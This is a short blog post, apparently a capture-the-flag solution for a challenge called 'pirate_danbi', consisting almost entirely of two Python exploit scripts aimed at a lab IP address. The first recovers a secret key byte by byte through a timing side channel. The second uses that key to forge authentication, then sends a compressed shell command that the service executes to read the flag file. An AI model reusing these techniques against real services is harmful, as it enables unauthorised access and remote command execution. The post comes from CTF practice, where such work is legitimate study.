---
layout: post
title: "pirate_danbi exp"
date: 2015-09-10 16:27:14 +0800
comments: true
categories: 
---

###0x00 read_key
	from socket import *
	from time import *


	ip = "192.168.56.101"
	port = 6666

	def xor(a,b):
		return chr(a^b)


	def p(a1, rev):
		r = socket(AF_INET, SOCK_STREAM)
		r.connect((ip,port))
		bz2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa".decode('hex')
		buf  = ''
		buf += "\x01\x00\x10"
		key =  ("aaaabbbb" + 'c'*(7-len(rev)) + chr(a1) + ''.join([xor(ord(i), len(rev)+1) for i in rev]))
		buf += key
		
		buf += "\x02\x00"
		buf += chr(len(bz2)) 
		buf += bz2

		buf +="\x03\x00\x00"*100000

		buf +="\x00\x00\x00"
		start = time()
		r.send(buf)
		r.recv(1024)
		end = time()
		#print ( end - start ) * 100
		if ( end - start ) * 100 > 20:
			return xor(len(rev) + 1, a1)
		else:
			return 'kkkk'
		

	rev = ''
	for j in range(8):
		for i in range(256):
			res = p(i, rev) 
			if res == 'kkkk':
				pass
			else:
				rev = (res + rev)
				break
		print '-'
		print rev.encode("hex")

	print rev.encode("hex")

###0x01 read_flag
	from bz2 import *
	from socket import *


	ip = '192.168.56.101'
	port = 7777

	def xor(a,b):
		return chr(a ^ b)



	def gen():
		key = '\x88\xfe\xdd\xa0\x20\x49\x88\x20'
		out = 'YO_DANBI_CREW_IN_THE_HOUSE.\x00'
		for i in range(32 - len(out)):
			out += '\x01'
		pay = ['\x20' for i in range(32)]
		for i in range(8):
			pay[24 + i] =  xor(ord(key[i]), ord(out[24 + i]))
		for i in range(3):
			for j in range(8):
				pay [(2-i)*8 + j ] = xor( (ord(out[(2-i)*8 + j ]) - ord(key[j]))&0xff , ord(pay[(3 - i) * 8 + j]) )
		return ''.join(pay)


	#r = remote(ip, port)
	r = socket(AF_INET, SOCK_STREAM)
	r.connect((ip, port))
	r.send("\x01\x00\x20")
	paya = gen()
	r.send(paya)

	r.send('\x04\x00\x00')   #auth

	cont = compress("cat /home/pirate_danbi/flag\n")
	r.send('\x02\x00' + chr(len(cont)) + cont)    #sava to bz2 file

	r.send('\x03\x00\x00')   #decompress


	r.send('\x05\x00\x00')   #exec
	r.send('\x00\x00\x00')
	print r.recv(1024)



